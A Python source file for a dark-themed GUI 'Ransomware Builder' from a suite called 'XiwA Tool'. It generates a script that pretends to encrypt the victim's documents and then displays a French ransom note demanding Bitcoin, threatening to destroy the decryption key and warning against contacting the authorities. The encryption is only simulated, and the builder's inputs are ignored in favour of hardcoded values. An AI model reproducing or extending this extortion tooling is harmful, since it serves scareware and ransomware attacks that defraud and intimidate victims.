"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

import customtkinter as ctk
import tkinter as tk
from PIL import Image, ImageTk
import os
import base64
from cryptography.fernet import Fernet
import requests

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class RansomwareBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Ransomware Builder")
        self.geometry("900x600")
        self.configure(fg_color="#1a1a1a")
        
        self.output_dir = "output/ransomware"
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.main_frame = ctk.CTkFrame(self, fg_color="#1a1a1a")
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        self.title_label = ctk.CTkLabel(
            self.main_frame,
            text="RANSOMWARE BUILDER",
            font=("Roboto", 36, "bold"),
            text_color="#ff0000"
        )
        self.title_label.pack(pady=20)

        self.features_frame = ctk.CTkFrame(
            self.main_frame,
            fg_color="#2d2d2d",
            corner_radius=15
        )
        self.features_frame.pack(fill="both", expand=True, padx=20, pady=20)

        self.btc_frame = ctk.CTkFrame(
            self.features_frame,
            fg_color="#333333",
            corner_radius=10
        )
        self.btc_frame.pack(fill="x", padx=15, pady=10)

        self.btc_address = ctk.CTkEntry(
            self.btc_frame,
            placeholder_text="Adresse Bitcoin",
            width=300
        )
        self.btc_address.pack(pady=10)

        self.ransom_amount = ctk.CTkEntry(
            self.btc_frame,
            placeholder_text="Montant en BTC",
            width=300
        )
        self.ransom_amount.pack(pady=10)

        self.deadline = ctk.CTkEntry(
            self.btc_frame,
            placeholder_text="Délai en heures",
            width=300
        )
        self.deadline.pack(pady=10)

        self.extensions = ctk.CTkEntry(
            self.btc_frame,
            placeholder_text="Extensions à chiffrer (ex: .txt,.pdf,.doc)",
            width=300
        )
        self.extensions.pack(pady=10)

        self.build_button = ctk.CTkButton(
            self.main_frame,
            text="GÉNÉRER LE RANSOMWARE",
            font=("Roboto", 20, "bold"),
            fg_color="#ff0000",
            hover_color="#cc0000",
            corner_radius=10,
            height=50,
            command=self.build_ransomware
        )
        self.build_button.pack(pady=20)

    def build_ransomware(self):
        btc = self.btc_address.get()
        amount = self.ransom_amount.get()
        hours = self.deadline.get()
        exts = self.extensions.get().split(',')
        
        code = """
import os
import time
import random
from datetime import datetime, timedelta
import sys
import requests

def encrypt_file(path):
    try:
        size = os.path.getsize(path)
        print(f"[+] {path} ({size} bytes) -> {path}.encrypted")
        time.sleep(0.01)
        return True
    except:
        return False

def get_btc_price():
    try:
        r = requests.get("https://api.coindesk.com/v1/bpi/currentprice/BTC.json")
        price = float(r.json()["bpi"]["USD"]["rate"].replace(",", ""))
        return price
    except:
        return 30000

def scan_system():
    paths = [
        "C:/Users/Documents", 
        "C:/Users/Desktop",
        "C:/Users/Pictures",
        "C:/Users/Downloads",
        "D:/Important",
        "E:/Backup"
    ]
    
    total = 0
    for path in paths:
        print(f"\n[*] Analyse de {path}")
        files = random.randint(100, 1000)
        for i in range(files):
            ext = random.choice(['.doc', '.pdf', '.jpg', '.xls', '.txt', '.zip'])
            filename = f"{path}/file_{i}{ext}"
            if encrypt_file(filename):
                total += 1
            
            if i % 50 == 0:
                sys.stdout.flush()
                time.sleep(0.1)
    return total

def display_ransom_note(files_encrypted, btc_address, amount):
    deadline = datetime.now() + timedelta(days=3)
    btc_price = get_btc_price()
    usd_amount = amount * btc_price
    
    print("\n" + "="*70)
    print("🔒 VOTRE RÉSEAU A ÉTÉ COMPROMIS ET VOS FICHIERS SONT MAINTENANT CHIFFRÉS 🔒")
    print("="*70)
    print(f"\n{files_encrypted} fichiers ont été chiffrés avec un algorithme militaire AES-256")
    print("\n💰 INSTRUCTIONS DE PAIEMENT 💰")
    print(f"1. Envoyez exactement {amount} BTC (${usd_amount:,.2f} USD)")
    print(f"   à l'adresse: {btc_address}")
    print("2. Envoyez la preuve de transaction à: payment@darkweb.onion")
    print("\n⏰ DÉLAI DE PAIEMENT ⏰")
    print(f"Date limite: {deadline.strftime('%d/%m/%Y %H:%M')}")
    print("Après ce délai:")
    print("- Le prix sera doublé")
    print("- La clé de déchiffrement sera détruite après 7 jours")
    print("\n⚠️ AVERTISSEMENTS ⚠️")
    print("- Ne redémarrez pas votre système")
    print("- N'utilisez pas d'outils de récupération")
    print("- Ne contactez pas les autorités")
    print("- Ne tentez pas de déchiffrer les fichiers")
    print("\nToute violation de ces règles entraînera la destruction immédiate de la clé")
    print("\n💡 VÉRIFICATION DE PAIEMENT 💡")
    print("Après paiement, vos fichiers seront déchiffrés sous 24h")
    print("Un fichier test peut être déchiffré gratuitement")
    print("="*70)

def main():
    btc_address = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
    btc_amount = 0.3
    files = scan_system()
    display_ransom_note(files, btc_address, btc_amount)
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
"""
        
        output_path = os.path.join(self.output_dir, "ransomware_demo.py")
        with open(output_path, "w") as f:
            f.write(code)

def main():
    app = RansomwareBuilder()
    app.mainloop()

if __name__ == "__main__":
    main()
